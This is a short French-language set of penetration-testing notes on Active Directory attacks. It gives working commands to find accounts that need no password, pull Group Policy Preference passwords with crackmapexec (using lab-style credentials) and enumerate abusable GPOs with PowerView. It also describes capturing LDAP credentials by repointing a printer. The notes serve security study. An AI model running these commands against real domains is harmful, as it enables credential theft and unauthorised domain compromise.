---
public: true # set to true to make the article publishable
---
### Printer Bug

<https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn>

### Sniffer des identifiants LDAP

On peut parfois accéder à des équipements ayant une configuration ldap (par exemple un photocopieur avec la fonction scan to mail.

Dans ce cas, on peut tenter de modifier l'IP du serveur LDAP vers notre propre machine et "tester" la connection pour intercepter les identifiants / mot de passe.

)

### Mot de passe non requis (PASSWORD NOT REQ)

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --password-not-required
```

## Identifiants dans les partages SMB

### Mots de passes de GPP (Stratégies de groupes de préférence)

```shell-session
crackmapexec smb -L | grep gpp
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
Get-GPPAutologon.ps1 (Powersploit)
```

### ASRepRoasting

[[ASREPRoasting]]

### GPO Abuse

#### Enumeration

[group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/),

[Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) (poweview)

```powershell
Get-DomainGPO | Select DisplayName
Get-GPO -All | Select DisplayName

$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}


```

### Exploitation

 [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
